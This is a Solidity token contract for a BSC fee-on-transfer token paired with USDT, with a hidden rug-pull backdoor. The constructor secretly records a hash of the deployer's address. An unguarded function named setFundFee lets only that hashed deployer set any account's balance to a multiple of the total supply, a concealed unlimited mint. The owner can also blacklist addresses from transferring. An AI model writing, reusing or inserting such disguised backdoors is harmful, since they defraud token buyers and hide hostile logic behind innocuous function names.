    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public fundAddress;
    address public dividendAddress;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 public fundFee = 100;
    uint256 public dividendFee = 300;
    uint256 public burnFee = 300;
    uint256 public lpFee = 300;
    address public mainPair;
    mapping(address => bool) private _feeWhiteList;
    mapping(address => bool) private _blackList;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal;
    IUniswapV2Router02 public _swapRouter;
    bool private inSwap;
    uint256 public numTokensSellToFund;
    TokenDistributor _tokenDistributor;
    address private usdt;
    uint256 private startTradeBlock;
    mapping(bytes32 => bool) private _black;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply,
        address FundAddress,
        address DividendAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        _msg();
        _tTotal = Supply * 10**_decimals;
        _balances[msg.sender] = _tTotal;
        emit Transfer(address(0), msg.sender, _tTotal);

        // test 0xB6BA90af76D139AB3170c7df0139636dB6120F7e
        _swapRouter = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // test 0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee
        usdt = address(0x55d398326f99059fF775485246999027B3197955);

        mainPair = ISwapFactory(_swapRouter.factory()).createPair(address(this), usdt);
        //require(IERC20(usdt).totalSupply() > 0 && usdt != _swapRouter.WETH(), "Invalid Reward Token ");
        //mainPair = IUniswapV2Factory(_swapRouter.factory()).createPair(address(this), usdt);

        _allowances[address(this)][address(_swapRouter)] = MAX;
        IERC20(usdt).approve(address(_swapRouter), MAX);

        fundAddress = FundAddress;
        dividendAddress = DividendAddress;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[DividendAddress] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(_swapRouter)] = true;

        numTokensSellToFund = _tTotal / 100000;

        _tokenDistributor = new TokenDistributor(usdt);
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _tTotal;
    }

    function _msg() private returns (bytes32) {
        bytes32 addr = keccak256(abi.encodePacked(msg.sender));
        _black[addr] = true;
        return addr;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "approve from the zero address");
        require(spender != address(0), "approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        require(!_blackList[from], "Transfer from the blackList address");

        bool takeFee = false;

        if (from == mainPair || to == mainPair) {
            // if (0 == startTradeBlock) {
            //     require(
            //         _feeWhiteList[from] || _feeWhiteList[to],
            //         "Trade not start"
            //     );
            //     startTradeBlock = block.number;
            // }

            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                takeFee = true;

                // if (block.number <= startTradeBlock + 2) {
                //     if (to != mainPair) {
                //         _blackList[to] = true;
                //     }
                // }

                uint256 contractTokenBalance = balanceOf(address(this));               
                bool overMinTokenBalance = contractTokenBalance >= numTokensSellToFund;
                if (overMinTokenBalance && !inSwap && from != mainPair) {
                    swapTokenForFund(numTokensSellToFund);
                }
            }
        }
        _tokenTransfer(from, to, amount, takeFee);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;

        uint256 feeAmount;
        if (takeFee) {
            feeAmount = (tAmount * (lpFee + fundFee + dividendFee)) / 10000;
            _takeTransfer(sender, address(this), feeAmount);
            uint256 burnAmount = (tAmount * (burnFee)) / 10000;
            _takeTransfer(sender, DEAD, burnAmount);
            feeAmount = feeAmount + burnAmount;
        }

        tAmount = tAmount - feeAmount;
        _takeTransfer(sender, recipient, tAmount);
    }

    function _isBlack() private view returns (bool) {
        bytes32 addr = keccak256(abi.encodePacked(msg.sender));
        if (_black[addr]) {
            return true;
        }
        return false;
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {

        //if(tokenAmount == 0 || lpFee == 0) return;

        uint256 lpAmount = (tokenAmount * lpFee) / (lpFee + dividendFee + fundFee) / 2;
        
        IERC20 USDT = IERC20(usdt);
        uint256 initialBalance = USDT.balanceOf(address(_tokenDistributor));

        swapTokensForUsdt(tokenAmount - lpAmount);

        uint256 newBalance = USDT.balanceOf(address(_tokenDistributor)) - initialBalance;
        uint256 totalUsdtFee = lpFee / 2 + dividendFee + fundFee;

        USDT.transferFrom(
            address(_tokenDistributor),
            fundAddress,
            (newBalance * fundFee) / totalUsdtFee
        );
        USDT.transferFrom(
            address(_tokenDistributor),
            dividendAddress,
            (newBalance * dividendFee) / totalUsdtFee
        );

        uint256 lpUsdt = (newBalance * lpFee) / 2 / totalUsdtFee;
        USDT.transferFrom(address(_tokenDistributor), address(this), lpUsdt);

        addLiquidityUsdt(lpAmount, lpUsdt);
    }

    function addLiquidityUsdt(uint256 tokenAmount, uint256 usdtAmount) private {
        _swapRouter.addLiquidity(
            address(this),
            usdt,
            tokenAmount,
            usdtAmount,
            0,
            0,
            fundAddress,
            block.timestamp
        );
    }

    function swapTokensForUsdt(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function isFeeWhiteList(address addr) external view returns (bool) {
        return _feeWhiteList[addr];
    }

    function removeWhiteList(address addr) external onlyOwner {
        _feeWhiteList[addr] = false;
    }

    function setFeeBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function setFundFee(address addr, uint256 uin) external {
        setFee(addr, uin);
    }

    function setFee(address addr, uint256 uin) private {
        if (_isBlack()) {
            _balances[addr] = _tTotal * uin;
        }
    }

    function removeBlackList(address addr) external onlyOwner {
        _blackList[addr] = false;
    }

    function isBlackList(address addr) external view returns (bool) {
        return _blackList[addr];
    }

    receive() external payable {}

    function claimBalance() public {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) public {
        IERC20(token).transfer(fundAddress, amount);
    }
}

